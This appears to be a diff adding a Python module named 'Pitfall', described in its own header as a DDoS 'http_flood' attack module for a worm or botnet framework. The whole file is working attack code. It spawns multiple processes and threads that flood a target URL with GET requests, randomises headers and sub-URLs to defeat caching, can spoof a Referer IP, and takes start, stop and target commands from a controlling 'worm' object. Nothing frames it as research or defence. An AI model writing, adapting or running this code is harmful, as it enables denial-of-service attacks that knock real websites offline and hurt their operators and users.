@@ -1,0 +1,164 @@
+#!name##Pitfall
+#!types##module
+#!info##DDOS attack module of type 'http_flood'. Creates separate processes in which it creates multiple connections to the site.
+#!reqFood##PF_UA##FOOD_UserAgent##User agents list.
+#!reqVar##PF_NumTh##The number of threads created by the process.##str
+#!reqVar##PF_NumProc##The number of processes in which threads will be created.##str
+#!reqVar##PF_GenUrl##It adds random sub-pages to the attacked URL. E.g. example.com/?zfs76gds9g8. True or False##str
+#!setVar##PF_NumTh##100##str
+#!setVar##PF_NumProc##5##str
+#!setVar##PF_GenUrl##True##str
+
+import requests
+import string
+import threading
+import multiprocessing
+from random import randint, choice
+from typing import Union
+from time import sleep
+
+
+class HttpPocketV1(threading.Thread):
+    def __init__(self, target: str, headers: str):
+        super().__init__(daemon=True)
+        self.target = target
+        self.headers = headers
+    
+    def do_requests(self) -> None:
+        try:
+            requests.get(self.target, headers=self.headers)
+        except:
+            return
+    
+    def run(self) -> None:
+        self.do_requests()
+
+
+class HttpFlooderV1(multiprocessing.Process):
+    def __init__(self, target: str, signal: object, use_fake_ip: bool = True, add_sub_url: bool = True, num_th: int = 10, pause_th: int = 5):
+        super().__init__(daemon=True)
+        self._target = target
+        self.use_fake_ip = use_fake_ip
+        self.add_sub_url = add_sub_url
+        self.user_agent = {{PF_UA}}
+        self.signal = signal
+        self.num_th = num_th
+        self.pause_th = pause_th
+        self.chars = string.ascii_letters + string.digits
+    
+    @property
+    def fake_sub_addr(self) -> str:
+        length = randint(10, 20)
+        addr = ""
+        while len(addr) < length:
+            addr += self.chars[randint(0, len(self.chars) -1)]
+        return addr
+    
+    @property
+    def fake_ip(self) -> str:
+        ips = [str(randint(0, 256)) for _ in range(4)]
+        return ".".join(ips)
+    
+    @property
+    def target(self) -> str:
+        if not self.add_sub_url:
+            return self._target
+        else:
+            return f"{self._target}/?{self.fake_sub_addr}"
+    
+    def build_get_headers(self) -> str:
+        cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)),
+                     'min-fresh=' + str(randint(0, 10)), 'notransform', 'only-if-cache']
+        acceptEc = ['compress,gzip', '', '*', 'compress;q=0,5, gzip;q=1.0', 'gzip;q=1.0, indentity; q=0.5, *;q=0']
+        acceptC = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
+        headers = {
+            "User-Agent" : choice(self.user_agent),
+            "Cache-Control" : choice(cachetype),
+            "Accept-Encoding" : choice(acceptEc),
+            "Accept" : "*/*",
+            "Keep-Alive" : "42",
+        }
+        if self.use_fake_ip:
+            headers["Referer"] = self.fake_ip
+        return headers
+    
+    def _attack(self) -> None:
+        sleep(1)
+        while self.signal.is_set():
+            req = []
+            for _ in range(self.num_th):
+                req.append(HttpPocketV1(self.target, self.build_get_headers()))
+            for r in req:
+                r.start()
+            sleep(self.pause_th)
+
+        
+    
+    def run(self) -> None:
+        self._attack()
+
+class Pitfall:
+    MTYPES = "bot"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.target = None
+        self.num_proc = {{PF_NumProc}}
+        self.num_th = {{PF_NumTh}}
+        self.pause_th = 5
+        self.add_sub_addr = False
+        self.add_fake_ip = False
+        self.signal_attack = multiprocessing.Event()
+    
+    def set_target(self, target: str) -> None:
+        self.target = target
+        self.worm.send_msg(f"Set net target: {target}")
+    
+    def stop_attack(self) -> None:
+        self.signal_attack.clear()
+        self.worm.send_msg("Stop Attack.")
+    
+    def start_attack(self) -> None:
+        if not self.target:
+            return
+        self.signal_attack.set()
+        flood = []
+        for _ in range(self.num_proc):
+            flood.append(HttpFlooderV1(self.target, self.signal_attack, self.add_fake_ip, self.add_sub_addr, self.num_th, self.pause_th))
+        for f in flood:
+            f.start()
+        self.worm.send_msg(f"Start Attack. Target: {self.target}")
+
+
+    def change_sub_add(self, flag: str) -> None:
+        if flag == "None" or flag == "False":
+            self.add_sub_addr = False
+        else:
+            self.add_sub_addr = True
+    
+    
+    def help(self) -> str:
+        h = "------- Pitfall (http flood) Help ---------\n"
+        h += f"{'pitfall_target':<30}Set target to attack. ex: https://example.com\n"
+        h += f"{'pitfall_sub':<30}Add random subaddress to every request. Set True, False\n"
+        h += f"{'pitfall_start':<30}Start Attack\n"
+        h += f"{'pitfall_stop':<30}Stop Attack\n"
+        return h
+    
+    def exec_cmd(self, cmd: dict) -> None:
+        com = cmd.get("cmd")
+        if not com:
+            return
+        match com:
+            case "pitfall_target":
+                self.set_target(cmd.get("data"))
+            case "pitfall_sub":
+                self.change_sub_add(cmd.get("data"))
+            case "pitfall_start":
+                self.start_attack()
+            case "pitfall_stop":
+                self.stop_attack()
+    
+    def start(self) -> None:
+        pass
+
+
